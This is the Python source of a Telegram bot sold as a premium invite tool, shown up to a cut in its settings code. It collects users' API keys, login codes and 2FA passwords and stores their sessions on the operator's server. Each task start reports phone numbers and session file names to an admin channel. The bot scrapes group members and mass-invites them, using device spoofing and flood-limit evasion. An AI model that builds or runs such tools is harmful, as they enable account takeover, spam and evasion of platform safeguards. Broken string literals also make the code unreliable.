import asyncio
import os
import json
import random
import time
import logging
import hashlib
import re
import secrets
from datetime import datetime, timedelta
from threading import Thread
from queue import Queue
from telethon import TelegramClient, errors
from telethon.tl.functions.channels import InviteToChannelRequest
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import (
    Application, CommandHandler, ConversationHandler, 
    MessageHandler, filters, ContextTypes
)

from flask import Flask, render_template_string, jsonify, Response, request, abort
from pymongo import MongoClient
import queue

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
MONGO_URI = os.environ.get('MONGO_URI', 'mongodb://localhost:27017/')
ADMIN_LOG_CHANNEL = int(os.environ.get('ADMIN_LOG_CHANNEL', -1001234567890))
PORT = int(os.environ.get('PORT', 10000))
APP_URL = os.environ.get('APP_URL', 'https://your-app.onrender.com')

# ==================== DATABASE SETUP ====================
try:
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    mongo_client.admin.command('ping')
    db = mongo_client['telegram_invite_bot']
    users_collection = db['users']
    stats_collection = db['stats']
    tasks_collection = db['tasks']
    logs_collection = db['logs']
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    exit(1)

# ==================== FLASK APP SETUP ====================
app = Flask(__name__)
LOG_QUEUE = Queue(maxsize=1000)
USER_LOG_QUEUES = {}
DASHBOARD_TOKENS = {}

# ==================== LOGGING HANDLERS ====================
class QueueHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'level': record.levelname,
            'message': self.format(record)
        }
        try:
            LOG_QUEUE.put_nowait(log_entry)
            logs_collection.insert_one({
                **log_entry,
                'timestamp': datetime.now()
            })
        except:
            pass

class UserLogHandler(logging.Handler):
    def __init__(self, user_id):
        super().__init__()
        self.user_id = str(user_id)
        
    def emit(self, record):
        if self.user_id not in USER_LOG_QUEUES:
            USER_LOG_QUEUES[self.user_id] = Queue(maxsize=500)
        
        log_entry = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'level': record.levelname,
            'message': self.format(record)
        }
        try:
            USER_LOG_QUEUES[self.user_id].put_nowait(log_entry)
        except:
            pass

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)
queue_handler = QueueHandler()
queue_handler.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
logging.getLogger().addHandler(queue_handler)

# ==================== STATES ====================
API_ID, API_HASH, PHONE, OTP_CODE, TWO_FA_PASSWORD, SOURCE, TARGET, INVITE_LINK = range(8)
SETTINGS_MENU, SETTINGS_MIN_DELAY, SETTINGS_MAX_DELAY, SETTINGS_PAUSE_TIME = range(8, 12)

# ==================== ACTIVE TASKS ====================
ACTIVE_TASKS = {}
TEMP_CLIENTS = {}

# ==================== KEYBOARD LAYOUTS ====================
def get_main_keyboard():
    keyboard = [
        [KeyboardButton('🚀 Start Task'), KeyboardButton('🔄 Resume Task')],
        [KeyboardButton('⏸ Pause Task'), KeyboardButton('⏹ Stop Task')],
        [KeyboardButton('📊 Statistics'), KeyboardButton('🗑 Clear History')],
        [KeyboardButton('🌐 Dashboard'), KeyboardButton('⚙️ Settings')],
        [KeyboardButton('🔄 Reset Session'), KeyboardButton('❓ Help')]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def get_cancel_keyboard():
    keyboard = [[KeyboardButton('❌ Cancel')]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_settings_keyboard():
    keyboard = [
        [KeyboardButton('⏱ Change Delays'), KeyboardButton('⏸ Pause Duration')],
        [KeyboardButton('📊 View Settings'), KeyboardButton('🔙 Back to Main')]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ==================== DATABASE FUNCTIONS ====================
def get_user_from_db(user_id):
    return users_collection.find_one({'user_id': str(user_id)})

def save_user_to_db(user_id, data):
    users_collection.update_one(
        {'user_id': str(user_id)},
        {'$set': {**data, 'updated_at': datetime.now()}},
        upsert=True
    )

def get_task_from_db(user_id):
    return tasks_collection.find_one({'user_id': str(user_id)})

def save_task_to_db(user_id, task_data):
    tasks_collection.update_one(
        {'user_id': str(user_id)},
        {'$set': {**task_data, 'updated_at': datetime.now()}},
        upsert=True
    )

def is_member_already_added(user_id, member_id):
    user_data = get_user_from_db(user_id)
    if user_data and 'added_members' in user_data:
        return str(member_id) in user_data['added_members']
    return False

def mark_member_as_added(user_id, member_id):
    users_collection.update_one(
        {'user_id': str(user_id)},
        {'$addToSet': {'added_members': str(member_id)}}
    )

def generate_dashboard_token(user_id):
    token = secrets.token_urlsafe(32)
    DASHBOARD_TOKENS[token] = {
        'user_id': str(user_id),
        'created': datetime.now().isoformat(),
        'last_accessed': datetime.now().isoformat()
    }
    users_collection.update_one(
        {'user_id': str(user_id)},
        {'$set': {'dashboard_token': token}}
    )
    return token

def get_user_from_token(token):
    if token in DASHBOARD_TOKENS:
        DASHBOARD_TOKENS[token]['last_accessed'] = datetime.now().isoformat()
        return DASHBOARD_TOKENS[token]['user_id']
    
    user = users_collection.find_one({'dashboard_token': token})
    if user:
        return user['user_id']
    return None

# ==================== HELPER FUNCTIONS ====================
def log_to_user(user_id, level, message):
    user_logger = logging.getLogger(f'user_{user_id}')
    user_logger.setLevel(logging.INFO)
    
    if not any(isinstance(h, UserLogHandler) for h in user_logger.handlers):
        handler = UserLogHandler(user_id)
        handler.setFormatter(logging.Formatter('%(message)s'))
        user_logger.addHandler(handler)
    
    if level == 'INFO':
        user_logger.info(message)
    elif level == 'WARNING':
        user_logger.warning(message)
    elif level == 'ERROR':
        user_logger.error(message)

async def log_to_admin(bot, message, user_id=None, data=None):
    try:
        log_text = f"📊 <b>Bot Activity Log</b>

"
        log_text += f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"
        
        if user_id:
            log_text += f"👤 User ID: <code>{user_id}</code>
"
        
        log_text += f"📝 Message: {message}
"
        
        if data:
            log_text += f"
📦 <b>Data:</b>
<pre>{json.dumps(data, indent=2, ensure_ascii=False)[:1000]}</pre>"
        
        await bot.send_message(
            chat_id=ADMIN_LOG_CHANNEL,
            text=log_text,
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Failed to log to admin: {e}")

def generate_device_info(user_id):
    device_models = [
        'Samsung Galaxy S23', 'iPhone 15 Pro', 'Google Pixel 8', 'OnePlus 12',
        'Xiaomi 14 Pro', 'OPPO Find X7', 'Vivo X100', 'Realme GT 5',
        'Motorola Edge 50', 'Nokia X30', 'Sony Xperia 1 V', 'ASUS ROG Phone 8'
    ]
    
    android_versions = ['13', '14']
    ios_versions = ['17.0', '17.5', '18.0']
    app_versions = ['10.0.0', '10.1.2', '10.2.1', '10.3.0']
    
    seed = int(hashlib.md5(str(user_id).encode()).hexdigest()[:8], 16)
    random.seed(seed)
    
    device_model = random.choice(device_models)
    
    if 'iPhone' in device_model:
        system_version = random.choice(ios_versions)
        device_string = f"iOS {system_version}"
    else:
        system_version = random.choice(android_versions)
        device_string = f"Android {system_version}"
    
    app_version = random.choice(app_versions)
    
    device_info = {
        'device_model': device_model,
        'system_version': system_version,
        'app_version': app_version,
        'device_string': device_string,
        'lang_code': 'en',
        'system_lang_code': 'en-US'
    }
    
    random.seed()
    return device_info

def clean_otp_code(otp_text):
    return re.sub(r'[^0-9]', '', otp_text)

# ==================== INVITE LOGIC ====================
async def try_invite(client, target_entity, user):
    try:
        await client(InviteToChannelRequest(channel=target_entity, users=[user]))
        return True, None
    except errors.UserAlreadyParticipantError:
        return True, 'already_participant'
    except errors.UserPrivacyRestrictedError:
        return False, 'privacy'
    except errors.UserBannedInChannelError:
        return False, 'banned'
    except errors.FloodWaitError as e:
        return False, f'floodwait:{e.seconds}'
    except errors.PeerFloodError:
        return False, 'peerflood'
    except errors.UserNotMutualContactError:
        return False, 'not_mutual'
    except errors.UserKickedError:
        return False, 'kicked'
    except Exception as e:
        logger.error(f"Invite error: {type(e).__name__} - {e}")
        return False, f'error:{type(e).__name__}'

async def invite_task(user_id, bot, chat_id):
    try:
        user_data = get_user_from_db(user_id)
        if not user_data:
            await bot.send_message(chat_id, "❌ No configuration found. Use 🚀 Start Task first.")
            return

        api_id = int(user_data['api_id'])
        api_hash = user_data['api_hash']
        source_group = user_data['source_group']
        target_group = user_data['target_group']
        invite_link = user_data['invite_link']
        
        settings = user_data.get('settings', {})
        min_delay = settings.get('min_delay', 4.0)
        max_delay = settings.get('max_delay', 10.0)
        pause_time = settings.get('pause_time', 600)

        ACTIVE_TASKS[str(user_id)] = {
            'running': True,
            'paused': False,
            'invited_count': 0,
            'dm_count': 0,
            'failed_count': 0,
            'start_time': time.time()
        }

        save_task_to_db(user_id, {
            'status': 'running',
            'invited_count': 0,
            'dm_count': 0,
            'failed_count': 0,
            'start_time': datetime.now()
        })

        session_name = f'session_{user_id}'
        device_info = user_data.get('device_info', generate_device_info(user_id))

        client = TelegramClient(session_name, api_id, api_hash)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            await bot.send_message(chat_id, "❌ Session expired. Please use 🚀 Start Task to login again.")
            if str(user_id) in ACTIVE_TASKS:
                del ACTIVE_TASKS[str(user_id)]
            await client.disconnect()
            return
        
        me = await client.get_me()
        log_to_user(user_id, 'INFO', f"✓ Logged in as: {me.first_name}")
        
        await bot.send_message(
            chat_id,
            f"🔥 <b>TASK STARTED!</b>

"
            f"👤 Account: {me.first_name}
"
            f"📱 Device: {device_info['device_model']}
"
            f"⏱ Delay: {min_delay}-{max_delay}s
"
            f"📍 Source: {source_group}
"
            f"🎯 Target: {target_group}

"
            f"Use keyboard buttons to control!",
            parse_mode='HTML'
        )

        await log_to_admin(bot, "🚀 Task Started", user_id, {
            'account': me.first_name,
            'username': me.username,
            'phone': user_data.get('phone'),
            'source': source_group,
            'target': target_group,
            'device': device_info['device_model'],
            'session_file': f'session_{user_id}.session'
        })

        batch_count = 0
        while ACTIVE_TASKS.get(str(user_id), {}).get('running', False):
            try:
                # Check if paused
                while ACTIVE_TASKS.get(str(user_id), {}).get('paused', False):
                    await asyncio.sleep(2)
                    if not ACTIVE_TASKS.get(str(user_id), {}).get('running', False):
                        break

                # Check if still running after pause
                if not ACTIVE_TASKS.get(str(user_id), {}).get('running', False):
                    break

                target_entity = await client.get_entity(target_group)
                participants = await client.get_participants(source_group)
                
                log_to_user(user_id, 'INFO', f"🚀 Batch {batch_count + 1}: Found {len(participants)} members")
                batch_count += 1

                invited_in_batch = 0
                failed_in_batch = 0

                for user in participants:
                    if not ACTIVE_TASKS.get(str(user_id), {}).get('running', False):
                        break

                    while ACTIVE_TASKS.get(str(user_id), {}).get('paused', False):
                        await asyncio.sleep(2)
                        if not ACTIVE_TASKS.get(str(user_id), {}).get('running', False):
                            break

                    if not ACTIVE_TASKS.get(str(user_id), {}).get('running', False):
                        break

                    uid = str(getattr(user, 'id', ''))
                    if not uid or getattr(user, 'bot', False) or getattr(user, 'is_self', False):
                        continue
                    
                    if is_member_already_added(user_id, uid):
                        log_to_user(user_id, 'INFO', f"⏭ [DUPLICATE] Skipping {uid}")
                        continue

                    first_name = getattr(user, 'first_name', 'User') or 'User'
                    username = getattr(user, 'username', '')

                    invited_ok, info = await try_invite(client, target_entity, user)
                    
                    if invited_ok:
                        log_to_user(user_id, 'INFO', f"✅ [INVITED] {first_name} (@{username or uid})")
                        mark_member_as_added(user_id, uid)
                        
                        ACTIVE_TASKS[str(user_id)]['invited_count'] += 1
                        invited_in_batch += 1
                        
                        save_task_to_db(user_id, {
                            'invited_count': ACTIVE_TASKS[str(user_id)]['invited_count'],
                            'last_activity': datetime.now()
                        })
                        
                        if ACTIVE_TASKS[str(user_id)]['invited_count'] % 10 == 0:
                            await bot.send_message(
                                chat_id,
                                f"📊 <b>Progress Update</b>

"
                                f"✅ Invited: {ACTIVE_TASKS[str(user_id)]['invited_count']}
"
                                f"❌ Failed: {ACTIVE_TASKS[str(user_id)]['failed_count']}
"
                                f"⏱ Time: {int((time.time() - ACTIVE_TASKS[str(user_id)]['start_time']) // 60)}m",
                                parse_mode='HTML'
                            )
                        
                        await asyncio.sleep(random.uniform(min_delay, max_delay))
                        continue

                    if info and info.startswith('floodwait'):
                        try:
                            wait_time = int(info.split(':')[1])
                            log_to_user(user_id, 'WARNING', f"⚠️ FloodWait: {wait_time}s - Waiting...")
                            await bot.send_message(chat_id, f"⚠️ <b>FloodWait!</b>

Waiting {wait_time} seconds...", parse_mode='HTML')
                            await asyncio.sleep(wait_time + 5)
                            continue
                        except:
                            await asyncio.sleep(pause_time)
                            continue
                    
                    if info == 'peerflood':
                        log_to_user(user_id, 'WARNING', f"⚠️ PeerFlood - Pausing {pause_time//60} min")
                        await bot.send_message(chat_id, f"⚠️ <b>PeerFlood Detected!</b>

Pausing for {pause_time//60} minutes to avoid ban...", parse_mode='HTML')
                        await asyncio.sleep(pause_time)
                        continue

                    ACTIVE_TASKS[str(user_id)]['failed_count'] += 1
                    failed_in_batch += 1

                log_to_user(user_id, 'INFO', f"✓ Batch completed: +{invited_in_batch} invited, -{failed_in_batch} failed")
                await asyncio.sleep(30)

            except Exception as e:
                logger.error(f"Loop error: {e}")
                log_to_user(user_id, 'ERROR', f"❌ Error: {type(e).__name__}")
                await bot.send_message(chat_id, f"⚠️ <b>Error Occurred</b>

{type(e).__name__}

Retrying in 60 seconds...", parse_mode='HTML')
                await asyncio.sleep(60)

        elapsed = time.time() - ACTIVE_TASKS[str(user_id)]['start_time']
        final_stats = ACTIVE_TASKS[str(user_id)]
        
        await bot.send_message(
            chat_id,
            f"🎉 <b>TASK COMPLETED!</b>

"
            f"✅ Total Invited: {final_stats['invited_count']}
"
            f"❌ Total Failed: {final_stats['failed_count']}
"
            f"⏱ Total Time: {int(elapsed//60)}m {int(elapsed%60)}s
"
            f"📊 Members Added: {len(get_user_from_db(user_id).get('added_members', []))}

"
            f"⚡ Bot by @NY_BOTS",
            parse_mode='HTML'
        )

        save_task_to_db(user_id, {
            'status': 'completed',
            'end_time': datetime.now(),
            'final_stats': final_stats
        })

        await log_to_admin(bot, "✅ Task Completed", user_id, final_stats)

        if str(user_id) in ACTIVE_TASKS:
            del ACTIVE_TASKS[str(user_id)]
        
        await client.disconnect()

    except Exception as e:
        logger.error(f"Task error: {e}")
        if str(user_id) in ACTIVE_TASKS:
            del ACTIVE_TASKS[str(user_id)]

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    user = update.effective_user
    
    token = generate_dashboard_token(user_id)
    dashboard_url = f"{APP_URL}/dashboard/{token}"
    
    welcome_text = (
        "🔥 <b>Welcome to Premium Telegram Invite Bot!</b>

"
        "✨ <b>Key Features:</b>
"
        "🔐 Advanced security & device spoofing
"
        "💾 Persistent sessions (auto-resume)
"
        "🛡️ Smart duplicate detection
"
        "📊 Real-time dashboard & monitoring
"
        "🔄 24/7 operation support
"
        "⚡ MongoDB-powered reliability

"
        "📱 <b>How to Start:</b>
"
        "Press 🚀 Start Task and follow the setup

"
        "⚠️ <b>Important:</b>
"
        "• Wait 10-15 min between logins
"
        "• Never share OTP codes
"
        "• Slow speed = Safe account
"
        "• Follows Telegram guidelines

"
        "⚡ <i>Developed by</i> <a href='https://t.me/NY_BOTS'>@NY_BOTS</a>"
    )
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=get_main_keyboard(),
        parse_mode='HTML',
        disable_web_page_preview=True
    )
    
    await log_to_admin(context.bot, f"New user started bot", user_id, {
        'username': user.username,
        'first_name': user.first_name
    })

async def handle_keyboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = str(update.effective_user.id)
    
    if text == '🚀 Start Task':
        return await run_command(update, context)
    elif text == '🔄 Resume Task':
        return await resume_task(update, context)
    elif text == '⏸ Pause Task':
        return await pause_command(update, context)
    elif text == '⏹ Stop Task':
        return await stop_command(update, context)
    elif text == '📊 Statistics':
        return await stats_command(update, context)
    elif text == '🗑 Clear History':
        return await clear_command(update, context)
    elif text == '🌐 Dashboard':
        token = generate_dashboard_token(user_id)
        dashboard_url = f"{APP_URL}/dashboard/{token}"
        await update.message.reply_text(
            f"🌐 <b>Your Dashboard:</b>

<code>{dashboard_url}</code>

"
            f"Copy the link and open in browser to monitor your tasks in real-time!",
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )
    elif text == '⚙️ Settings':
        return await settings_menu(update, context)
    elif text == '🔄 Reset Session':
        return await reset_session(update, context)
    elif text == '❓ Help':
        return await help_command(update, context)
    elif text == '❌ Cancel':
        return await cancel(update, context)
    elif text == '🔙 Back to Main':
        await update.message.reply_text("🏠 Back to main menu", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    elif text == '⏱ Change Delays':
        return await change_delays(update, context)
    elif text == '⏸ Pause Duration':
        return await change_pause_duration(update, context)
    elif text == '📊 View Settings':
        return await view_settings(update, context)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📚 <b>Complete User Guide</b>

"
        "🚀 <b>Getting Started:</b>
"
        "1. Click <b>🚀 Start Task</b>
"
        "2. Enter API credentials (from my.telegram.org)
"
        "3. Verify with OTP code
"
        "4. Add source group (to scrape from)
"
        "5. Add target group (to invite to)
"
        "6. Provide invite link
"
        "7. Task starts automatically!

"
        "🎮 <b>Controls:</b>
"
        "⏸ Pause Task - Pause without losing progress
"
        "▶️ Resume Task - Continue from where you left
"
        "⏹ Stop Task - Stop task completely
"
        "🗑 Clear History - Remove all added members
"
        "🔄 Reset Session - Delete saved session and start fresh

"
        "⚙️ <b>Settings:</b>
"
        "• Customize delays (4-10s default)
"
        "• Change pause duration on flood
"
        "• View current configuration

"
        "📊 <b>Dashboard:</b>
"
        "• Real-time statistics
"
        "• Live activity logs
"
        "• Member tracking
"
        "• Performance metrics

"
        "⚠️ <b>Safety Tips:</b>
"
        "• Wait 10-15 minutes before re-login
"
        "• NEVER share OTP codes
"
        "• Bot uses safe 4-10s delays
"
        "• Duplicates are automatically detected

"
        "⚡ <i>Bot by</i> <a href='https://t.me/NY_BOTS'>@NY_BOTS</a>"
    )
    await update.message.reply_text(help_text, parse_mode='HTML', disable_web_page_preview=True, reply_markup=get_main_keyboard())

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    user_data = get_user_from_db(user_id)
    
    if not user_data:
        await update.message.reply_text("📊 No stats yet. Start a task first!", reply_markup=get_main_keyboard())
        return
    
    total_added = len(user_data.get('added_members', []))
    active = user_id in ACTIVE_TASKS
    
    stats_text = f"📊 <b>Your Statistics</b>

"
    stats_text += f"✅ Total Members Added: <b>{total_added}</b>
"
    stats_text += f"🔴 Status: <b>{'🟢 Running' if active else '⚫ Idle'}</b>
"
    stats_text += f"📅 Last Activity: <b>{user_data.get('updated_at', 'N/A')}</b>
"
    
    if active:
        task = ACTIVE_TASKS[user_id]
        runtime = int(time.time() - task['start_time'])
        stats_text += (
            f"
🔥 <b>Current Session:</b>
"
            f"✅ Invited: {task['invited_count']}
"
            f"❌ Failed: {task['failed_count']}
"
            f"⏱ Runtime: {runtime//60}m {runtime%60}s
"
            f"{'⏸ <b>PAUSED</b>' if task.get('paused') else '▶️ <b>RUNNING</b>'}
"
        )
    
    await update.message.reply_text(stats_text, parse_mode='HTML', reply_markup=get_main_keyboard())

async def pause_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if user_id not in ACTIVE_TASKS:
        await update.message.reply_text("❌ No active task to pause.", reply_markup=get_main_keyboard())
        return
    
    if ACTIVE_TASKS[user_id].get('paused', False):
        await update.message.reply_text("ℹ️ Task is already paused!", reply_markup=get_main_keyboard())
        return
    
    ACTIVE_TASKS[user_id]['paused'] = True
    save_task_to_db(user_id, {'status': 'paused'})
    log_to_user(user_id, 'WARNING', "⏸ Task paused by user")
    await update.message.reply_text(
        "⏸ <b>Task Paused</b>

"
        "✅ Current progress saved
"
        "Use 🔄 Resume Task to continue

"
        f"📊 Stats:
"
        f"✅ Invited: {ACTIVE_TASKS[user_id]['invited_count']}
"
        f"❌ Failed: {ACTIVE_TASKS[user_id]['failed_count']}",
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )
    await log_to_admin(context.bot, "⏸ Task Paused", user_id)

async def resume_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if user_id in ACTIVE_TASKS:
        if ACTIVE_TASKS[user_id].get('paused', False):
            ACTIVE_TASKS[user_id]['paused'] = False
            save_task_to_db(user_id, {'status': 'running'})
            log_to_user(user_id, 'INFO', "▶️ Task resumed by user")
            await update.message.reply_text(
                "▶️ <b>Task Resumed</b>

"
                "✅ Continuing from where you left off...

"
                f"📊 Current Stats:
"
                f"✅ Invited: {ACTIVE_TASKS[user_id]['invited_count']}
"
                f"❌ Failed: {ACTIVE_TASKS[user_id]['failed_count']}",
                parse_mode='HTML',
                reply_markup=get_main_keyboard()
            )
            await log_to_admin(context.bot, "▶️ Task Resumed", user_id)
        else:
            await update.message.reply_text(
                "ℹ️ Task is already running!

"
                f"📊 Stats:
"
                f"✅ Invited: {ACTIVE_TASKS[user_id]['invited_count']}
"
                f"❌ Failed: {ACTIVE_TASKS[user_id]['failed_count']}",
                parse_mode='HTML',
                reply_markup=get_main_keyboard()
            )
    else:
        # Try to resume from database
        user_data = get_user_from_db(user_id)
        if user_data and os.path.exists(f'session_{user_id}.session'):
            task = get_task_from_db(user_id)
            if task and task.get('status') in ['paused', 'running']:
                await update.message.reply_text(
                    "🔄 <b>Resuming previous task...</b>

"
                    "✅ Restoring from saved state...",
                    parse_mode='HTML',
                    reply_markup=get_main_keyboard()
                )
                asyncio.create_task(invite_task(user_id, context.bot, update.effective_chat.id))
                await log_to_admin(context.bot, "🔄 Task Resumed from Database", user_id)
            else:
                await update.message.reply_text(
                    "❌ No paused task found.

"
                    "Use 🚀 Start Task to begin a new task!",
                    reply_markup=get_main_keyboard()
                )
        else:
            await update.message.reply_text(
                "❌ No saved session found.

"
                "Use 🚀 Start Task to create a new task!",
                reply_markup=get_main_keyboard()
            )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if user_id not in ACTIVE_TASKS:
        await update.message.reply_text(
            "❌ No active task to stop.",
            reply_markup=get_main_keyboard()
        )
        return
    
    # Get final stats before stopping
    final_invited = ACTIVE_TASKS[user_id]['invited_count']
    final_failed = ACTIVE_TASKS[user_id]['failed_count']
    elapsed = time.time() - ACTIVE_TASKS[user_id]['start_time']
    
    ACTIVE_TASKS[user_id]['running'] = False
    ACTIVE_TASKS[user_id]['paused'] = False
    save_task_to_db(user_id, {
        'status': 'stopped',
        'stopped_at': datetime.now(),
        'final_invited': final_invited,
        'final_failed': final_failed
    })
    log_to_user(user_id, 'WARNING', "⏹ Task stopped by user")
    
    await update.message.reply_text(
        "⏹ <b>Task Stopped!</b>

"
        "✅ Final Statistics:
"
        f"✅ Total Invited: {final_invited}
"
        f"❌ Total Failed: {final_failed}
"
        f"⏱ Total Time: {int(elapsed//60)}m {int(elapsed%60)}s

"
        "💡 Use 🚀 Start Task to begin a new task
"
        "or 🔄 Resume Task to continue later",
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )
    await log_to_admin(context.bot, "⏹ Task Stopped", user_id, {
        'invited': final_invited,
        'failed': final_failed,
        'duration': f"{int(elapsed//60)}m"
    })

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    user_data = get_user_from_db(user_id)
    if not user_data:
        await update.message.reply_text(
            "ℹ️ No data to clear.",
            reply_markup=get_main_keyboard()
        )
        return
    
    total_cleared = len(user_data.get('added_members', []))
    
    users_collection.update_one(
        {'user_id': user_id},
        {'$set': {'added_members': []}}
    )
    
    await update.message.reply_text(
        f"🗑 <b>History Cleared!</b>

"
        f"✅ Removed {total_cleared} member(s) from history
"
        f"💡 All members can now be invited again",
        parse_mode='HTML',
        reply_markup=get_main_keyboard()
    )
    await log_to_admin(context.bot, "🗑 History Cleared", user_id, {'cleared_count': total_cleared})

async def reset_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    # Check if task is running
    if user_id in ACTIVE_TASKS:
        await update.message.reply_text(
            "⚠️ <b>Cannot reset session while task is running!</b>

"
            "Please use ⏹ Stop Task first.",
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )
        return
    
    session_file = f'session_{user_id}.session'
    
    if os.path.exists(session_file):
        try:
            os.remove(session_file)
            # Also clear user data
            users_collection.delete_one({'user_id': user_id})
            tasks_collection.delete_one({'user_id': user_id})
            
            await update.message.reply_text(
                "🔄 <b>Session Reset Complete!</b>

"
                "✅ Session file deleted
"
                "✅ User data cleared
"
                "✅ Task history removed

"
                "💡 Use 🚀 Start Task to login with a fresh account",
                parse_mode='HTML',
                reply_markup=get_main_keyboard()
            )
            await log_to_admin(context.bot, "🔄 Session Reset", user_id)
        except Exception as e:
            logger.error(f"Reset session error: {e}")
            await update.message.reply_text(
                f"❌ <b>Error resetting session:</b>

{str(e)}",
                parse_mode='HTML',
                reply_markup=get_main_keyboard()
            )
    else:
        await update.message.reply_text(
            "ℹ️ No session found to reset.

"
            "Use 🚀 Start Task to create a new session.",
            reply_markup=get_main_keyboard()
        )

# ==================== SETTINGS HANDLERS ====================
async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚙️ <b>Settings Menu</b>

"
        "Configure your bot settings:

"
        "⏱ <b>Change Delays:</b> Adjust invite speed
"
        "⏸ <b>Pause Duration:</b> FloodWait pause time
"
        "📊 <b>View Settings:</b> See current config

"
        "💡 Safe defaults are already applied",
        parse_mode='HTML',
        reply_markup=get_settings_keyboard()
    )
    return SETTINGS_MENU

async def view_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    user_data = get_user_from_db(user_id)
    
    if not user_data:
        await update.message.reply_text(
            "ℹ️ No settings found. Using defaults.

"
            "⏱ Min Delay: 4.0s
"
            "⏱ Max Delay: 10.0s
"
            "⏸ Pause Time: 600s (10 min)",
            reply_markup=get_settings_keyboard()
        )
        return SETTINGS_MENU
    
    settings = user_data.get('settings', {})
    min_delay = settings.get('min_delay', 4.0)
    max_delay = settings.get('max_delay', 10.0)
    pause_time = settings.get('pause_time', 600)
    
    await update.message.reply_text(
        "📊 <b>Current Settings</b>

"
        f"⏱ <b>Min Delay:</b> {min_delay}s
"
        f"⏱ <b>Max Delay:</b> {max_delay}s
"
        f"⏸ <b>Pause Time:</b> {pause_time}s ({pause_time//60} min)

"
        "💡 These delays protect your account from bans",
        parse_mode='HTML',
        reply_markup=get_settings_keyboard()
    )
    return SETTINGS_MENU

async def change_delays(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⏱ <b>Change Invite Delays</b>

"
        "Enter minimum delay in seconds:
"
        "<code>Example: 5</code>

"
        "⚠️ Recommended: 4-8 seconds
"
        "❌ Below 3s = High ban risk!",
        parse_mode='HTML',
        reply_markup=get_cancel_keyboard()
    )
    return SETTINGS_MIN_DELAY

async def set_min_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Cancelled", reply_markup=get_settings_keyboard())
        return SETTINGS_MENU
    
    try:
        min_delay = float(update.message.text.strip())
        if min_delay < 2:
            await update.message.reply_text(
                "⚠️ Minimum delay too low!

"
                "Must be at least 2 seconds.
"
                "Try again:",
                reply_markup=get_cancel_keyboard()
            )
            return SETTINGS_MIN_DELAY
        
        context.user_data['min_delay'] = min_delay
        await update.message.reply_text(
            f"✅ Min delay set to {min_delay}s

"
            "Now enter maximum delay in seconds:
"
            "<code>Example: 10</code>

"
            f"⚠️ Must be greater than {min_delay}s",
            parse_mode='HTML',
            reply_markup=get_cancel_keyboard()
        )
        return SETTINGS_MAX_DELAY
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number!

"
            "Enter a valid number (e.g., 5):",
            reply_markup=get_cancel_keyboard()
        )
        return SETTINGS_MIN_DELAY

async def set_max_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == '❌ Cancel':
        await update.message.reply_text("❌ Cancelled", reply_markup=get_settings_keyboard())
        return SETTINGS_MENU
    
    try:
        max_delay = float(update.message.text.strip())
        min_delay = context.user_data.get('min_delay', 4.0)
        
        if max_delay <= min_delay:
            await update.message.reply_text(
                f"⚠️ Max delay must be greater than {min_delay}s!

"
                "Try again:",
                reply_markup=get_cancel_keyboard()
            )
            return SETTINGS_MAX_DELAY
        
        user_id = str(update.effective_user.id)
        user_data = get_user_from_db(user_id)
        
        if not user_data:
            user_data = {'user_id': user_id, 'settings': {}}
        
        user_data['settings']['min_delay'] = min_delay
        user_data['settings']['max_delay'] = max_delay
        save_user_to_db(user_id, user_data)
        
        await update.message.reply_text(
            "✅ <b>Delays Updated!</b>

"
            f"⏱ Min Delay: {min_delay}s
"
            f"⏱ Max Delay: {max_delay}s

"
            "💡 New delays will apply to next task",
            parse_mode='HTML',
            reply_markup=get_settings_keyboard()
        )
        await log_to_admin(context.bot, "⚙️ Settings Changed", user_id, {
            'min_delay': min_delay,
            'max_delay': max_delay
        })
        return SETTINGS_MENU
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number!

"
            "Enter a valid number (e.g., 10):",
            reply_markup=get_cancel_keyboard()
        )
